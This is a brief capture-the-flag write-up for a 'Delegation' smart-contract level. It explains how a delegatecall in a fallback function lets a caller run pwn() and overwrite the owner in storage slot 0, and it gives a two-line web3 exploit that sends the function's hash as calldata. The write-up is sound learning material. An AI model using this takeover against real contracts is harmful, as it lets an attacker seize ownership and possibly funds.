# Delegation

delegatecall() allows contract to execute a function() in an other contract but use the caller contract's states(storage layout must be the same)

1. send transaction which will trigger fallback()
2. fallback() of Delegation will call pwn() in Delegate
3. pwn() will set the owner of Delegation (storage slot 0)

```javascript
const pwn = web3.utils.keccak256("pwn()")
await contract.sendTransaction({ data: pwn })
```

---

-   https://solidity-by-example.org/hacks/delegatecall/
